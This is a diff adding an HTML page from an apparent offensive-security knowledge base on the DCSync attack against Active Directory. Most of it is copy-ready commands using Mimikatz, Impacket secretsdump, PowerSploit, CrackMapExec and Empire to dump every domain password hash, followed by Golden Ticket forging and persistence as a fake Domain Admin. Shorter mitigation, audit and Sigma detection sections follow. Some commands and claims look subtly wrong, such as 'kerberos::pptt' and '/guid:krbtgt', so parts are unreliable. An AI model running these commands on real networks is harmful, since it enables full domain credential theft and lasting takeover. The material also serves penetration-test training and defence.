@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DCSync Attack | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .severity-badge { display: inline-block; padding: 0.5rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-critical { background: rgba(255,68,68,0.2); color: #ff4444; }
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin: 1.5rem 0; padding: 1rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; }
+    .meta-item { padding: 0.5rem; }
+    .meta-item strong { display: block; color: var(--primary); margin-bottom: 0.25rem; font-size: 0.7rem; text-transform: uppercase; }
+    .meta-item span { color: var(--text-secondary); font-size: 0.85rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; font-weight: 600; }
+    .content-section p { margin: 0.75rem 0; color: var(--text-secondary); line-height: 1.7; }
+    .content-section ul, .content-section ol { margin: 1rem 0; padding-left: 1.5rem; color: var(--text-secondary); }
+    .content-section li { margin: 0.5rem 0; line-height: 1.6; }
+    .content-section code { background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px; color: var(--primary); font-family: 'Courier New', monospace; font-size: 0.9em; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; color: var(--primary); position: relative; }
+    .code-block pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: 1px solid var(--border); padding: 0.4rem 0.8rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.75rem; transition: var(--transition); }
+    .copy-btn:hover { color: var(--primary); background: var(--bg-card); }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    .back-link:hover { text-decoration: underline; }
+    .vulnerability-box { background: rgba(255,68,68,0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .vulnerability-box strong { color: #ff4444; }
+    .mitigation-box { background: rgba(0,245,160,0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box strong { color: var(--primary); }
+    .info-box { background: rgba(79,140,255,0.1); border-left: 4px solid #4f8cff; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .info-box strong { color: #4f8cff; }
+    @media (max-width: 768px) { .meta-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="index.html">Active Directory</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
+</nav>
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / <a href="index.html">Active Directory</a> / DCSync
+    </div>
+    <div class="page-header">
+      <span class="severity-badge severity-critical"><i class="fas fa-exclamation-triangle"></i> Critical Severity | T1003.002</span>
+      <h1>🔓 DCSync Attack</h1>
+      <div class="meta-grid">
+        <div class="meta-item"><strong>MITRE</strong><span>T1003.002</span></div>
+        <div class="meta-item"><strong>Platform</strong><span>Windows AD</span></div>
+        <div class="meta-item"><strong>Phase</strong><span>Credential Access</span></div>
+        <div class="meta-item"><strong>Difficulty</strong><span>Medium</span></div>
+      </div>
+    </div>
+    <div class="content-section" id="description">
+      <h2>🧠 Description</h2>
+      <p>DCSync simulates the behavior of a Domain Controller and requests password hashes from other Domain Controllers via the Directory Replication Service (DRS) protocol. This technique allows attackers to extract all password hashes from the domain without directly accessing the NTDS.dit file.</p>
+      <div class="vulnerability-box">
+        <strong>Why DCSync Works:</strong>
+        <ul>
+          <li><strong>Valid Replication Request:</strong> DCs naturally replicate with each other</li>
+          <li><strong>No NTDS Access:</strong> Don't need to directly access database file</li>
+          <li><strong>Domain-Level Access:</strong> Any account with Replicating Directory Changes permissions</li>
+          <li><strong>krbtgt Hash:</strong> Allows Golden Ticket creation for persistence</li>
+        </ul>
+      </div>
+      <p><strong>Required Permissions:</strong></p>
+      <ul>
+        <li><strong>Replicating Directory Changes</strong> (DS-Replication-Get-Changes)</li>
+        <li><strong>Replicating Directory Changes All</strong> (DS-Replication-Get-Changes-All)</li>
+        <li><strong>Replicate Directory Changes</strong> (ACRp)</li>
+      </ul>
+      <p>Accounts with these rights: Domain Admins, Enterprise Admins, Domain Controller accounts, accounts explicitly granted these permissions.</p>
+    </div>
+    <div class="content-section" id="execution">
+      <h2>💣 Execution</h2>
+      <p><strong>Mimikatz - DCSync:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Get all hashes
+mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:corp.com /all" "exit"
+
+# Get specific user hash
+mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:corp.com /user:administrator" "exit"
+
+# Get krbtgt hash for golden ticket
+mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:corp.com /user:krbtgt" "exit"
+
+# Get krbtgt only
+mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:corp.com /guid:krbtgt" "exit"</pre>
+      </div>
+      <p><strong>Impacket (Linux):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Secretsdump - extract all hashes
+python3 secretsdump.py corp.com/username:password@dc01.corp.com
+
+# With hash
+python3 secretsdump.py corp.com/username@dc01.corp.com -hashes :ntlmhash
+
+# Using credential relay
+python3 secretsdump.py -hashes :adminhash corp.com/attacker@dc01.corp.com
+
+# Target specific DC
+python3 secretsdump.py corp.com/user:pass@dc02.corp.com</pre>
+      </div>
+      <p><strong>PowerShell (PowerSploit):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Using PowerView
+Import-Module .\PowerView.ps1
+
+# Check who has replication rights
+Get-ADObject -SearchBase "DC=corp,DC=com" -Filter {ObjectClass -eq 'group'} -Properties Member | Where-Object { $_.Member -like '*replication*' }
+
+# Perform DCSync
+Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp.com /all"'
+
+# Specific user
+Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp.com /user:corp\administrator"'</pre>
+      </div>
+      <p><strong>CrackMapExec:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Using secretsdump module
+crackmapexec smb dc01.corp.com -u username -p password -d corp.com --local-auth -M secretsdump
+
+# With hash
+crackmapexec smb dc01.corp.com -u username -H ntlmhash --local-auth -M secretsdump</pre>
+      </div>
+    </div>
+    <div class="content-section" id="golden-ticket">
+      <h2>🎫 Golden Ticket from DCSync</h2>
+      <p>Once you have the krbtgt hash, you can create a Golden Ticket for permanent domain access:</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Get these values from DCSync output:
+# - krbtgt NTLM hash
+# - Domain SID (S-1-5-21-xxxxx)
+# - Domain name (corp.com)
+# - Domain Controller FQDN (dc01.corp.com)
+
+# Create Golden Ticket
+mimikatz "kerberos::golden /domain:corp.com /sid:S-1-5-21-1234567890-1234567890-1234567890 /rc4:krbtgt_ntlm_hash /user:Administrator /ticket:golden.kirbi" "exit"
+
+# Use Golden Ticket
+mimikatz "kerberos::pptt golden.kirbi" "exit"
+
+# Now access any resource as DA
+dir \\dc01.corp.com\c$</pre>
+      </div>
+      <p><strong>Empire/Covenant:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Empire
+usemodule credentials/invoke-mimikatz
+execute
+# DC Sync will dump all hashes
+# Use krbtgt hash for golden ticket
+
+# Covenant
+implant/dcsync
+# Select krbtgt account
+# Will dump all hashes</pre>
+      </div>
+    </div>
+    <div class="content-section" id="persistence">
+      <h2>🎯 Persistence via DCSync</h2>
+      <p><strong>1. KRBTGT Rotation Abuse:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># DCSync gives you current KRBTGT hash
+# Even after password reset, old hash still works for ~21 days
+# By default, KRBTGT password changes every 30 days
+# Reset it twice to invalidate all existing TGTs
+
+# But you have the old hash, so you can forge TGTs anytime</pre>
+      </div>
+      <p><strong>2. Add Domain Admin via DCSynced Hash:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create Golden Ticket with DA privileges embedded
+mimikatz "kerberos::golden /domain:corp.com /sid:SID /rc4:HASH /user:FAKE_ADMIN /groups:512 /ticket:evil.kirbi" "exit"
+
+# Groups 512 = Domain Admins
+# Now you have TGT that grants DA access without being actual DA</pre>
+      </div>
+    </div>
+    <div class="content-section" id="impact">
+      <h2>💥 Impact</h2>
+      <div class="vulnerability-box">
+        <strong>Potential Damage:</strong>
+        <ul>
+          <li><strong>Complete Domain Compromise:</strong> All password hashes exposed</li>
+          <li><strong>Permanent Access:</strong> Golden Ticket from krbtgt hash</li>
+          <li><strong>Pass-the-Hash:</strong> Use any user's hash for lateral movement</li>
+          <li><strong>Trust Exploitation:</strong> Use krbtgt to access trusted domains</li>
+          <li><strong>Detection Bypass:</strong> No files written to disk</li>
+        </ul>
+      </div>
+    </div>
+    <div class="content-section" id="mitigation">
+      <h2>🛡️ Mitigation</h2>
+      <div class="mitigation-box">
+        <strong>✅ Primary Controls:</strong>
+        <ul>
+          <li><strong>Limit Replication Rights:</strong> Only DCs should have Replicating Directory Changes</li>
+          <li><strong>Privileged Role Management:</strong> Use PIM/JIT for admin tasks</li>
+          <li><strong>Monitor Replication Events:</strong> Alert on unexpected DCSync</li>
+          <li><strong>Enable Microsoft Defender for Identity:</strong> Detect DCSync</li>
+          <li><strong>Audit ACLs:</strong> Find users with replication permissions</li>
+          <li><strong>KRBTGT Rotation:</strong> Reset twice during incident response</li>
+        </ul>
+      </div>
+      <p><strong>Audit Replication Permissions:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Find who has replication rights
+Get-ADObject -Filter {(ObjectClass -eq 'user')} -SearchBase "DC=corp,DC=com" -Properties MemberOf, ntSecurityDescriptor | Where-Object { $_.ntSecurityDescriptor -match 'Replicating' }
+
+# PowerView audit
+Import-Module .\PowerView.ps1
+Get-DomainObjectAcl -SearchBase "DC=corp,DC=com" -ResolveGUIDs | Where-Object { $_.ObjectAceTypeName -eq 'ReplicatingDirectoryChanges' }
+
+# Check group membership for DC accounts
+Get-ADGroupMember "Domain Controllers"</pre>
+      </div>
+    </div>
+    <div class="content-section" id="detection">
+      <h2>🔍 Detection</h2>
+      <p><strong>Event ID Monitoring:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Event ID 4662 - Directory Service Access
+# Logged when Replicating Directory Changes is used
+# Check for:
+# - Operations on ntDSDIT object
+# - Account name of requestor
+# - Look for non-DC accounts
+
+Get-WinEvent -FilterHashtable @{LogName='Security';ID=4662} | 
+    Where-Object { $_.Message -match 'Replicating' -and $_.Message -notmatch 'Domain Controllers' }
+
+# Event ID 5136 - Directory Service Object Modification
+# When object ACLs are modified
+
+# Event ID 4670 - Permissions on object changed</pre>
+      </div>
+      <p><strong>Microsoft Defender for Identity Alert:</strong></p>
+      <div class="info-box">
+        <strong>MDI Signature: Suspicious replication of directory services</strong>
+        <p>This alert triggers when a non-Domain Controller performs replication operations. It's a clear indicator of DCSync attack.</p>
+      </div>
+      <p><strong>Sigma Rule:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>title: DCSync Attack Detection
+id: dcsync-detection
+status: experimental
+logsource:
+  product: windows
+  service: security
+detection:
+  selection:
+    EventID: 4662
+    ObjectType: 'ntDSDIT'
+    AccessMask: 0x100
+  filter:
+    SubjectDomainName: 'Domain Controllers'
+  condition: selection and not filter
+level: critical</pre>
+      </div>
+    </div>
+    <div class="content-section" id="tools">
+      <h2>🛠️ Tools</h2>
+      <ul>
+        <li><strong>Mimikatz:</strong> lsadump::dcsync</li>
+        <li><strong>Impacket (secretsdump):</strong> Python implementation</li>
+        <li><strong>PowerView:</strong> PowerShell enumeration</li>
+        <li><strong>CrackMapExec:</strong> secretsdump module</li>
+        <li><strong>Empire:</strong> DCSync module</li>
+        <li><strong>BloodHound:</strong> Identify accounts with replication rights</li>
+      </ul>
+    </div>
+    <div class="content-section" id="references">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https:// github.com/gentilkiwi/mimikatz/wiki" target="_blank">Mimikatz Wiki</a></li>
+        <li><a href="https:// docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc772712(v=ws.10)" target="_blank">MS DRS Protocol</a></li>
+        <li><a href="https://blog.stealthbits.com/more-than-you-wanted-to-know-about-dcsync/" target="_blank">DCSync Deep Dive</a></li>
+        <li><a href="https://docs.microsoft.com/en-us/defender-for-identity/alerts-start#suspicous-replication-of-directory-services" target="_blank">MDI Alert</a></li>
+      </ul>
+    </div>
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Active Directory</a>
+  </div>
+</main>
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+    <p>Always test in authorized environments only.</p>
+  </div>
+</footer>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) { mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show')); }
+  const themeToggle = document.getElementById('themeToggle');
+  if (themeToggle) {
+    themeToggle.addEventListener('click', () => {
+      document.body.classList.toggle('light');
+      const icon = themeToggle.querySelector('i');
+      const text = themeToggle.querySelector('span');
+      if (document.body.classList.contains('light')) { icon.classList.remove('fa-moon'); icon.classList.add('fa-sun'); text.textContent = 'Light'; }
+      else { icon.classList.remove('fa-sun'); icon.classList.add('fa-moon'); text.textContent = 'Dark'; }
+      localStorage.setItem('theme-preference', document.body.classList.contains('light') ? 'light' : 'dark');
+    });
+  }
+  if (localStorage.getItem('theme-preference') === 'light') document.body.classList.add('light');
+});
+function copyCode(btn) { const code = btn.parentElement.querySelector('pre').innerText; navigator.clipboard.writeText(code); btn.textContent = 'Copied!'; setTimeout(() => { btn.textContent = 'Copy'; }, 2000); }
+</script>
+</body>
+</html>
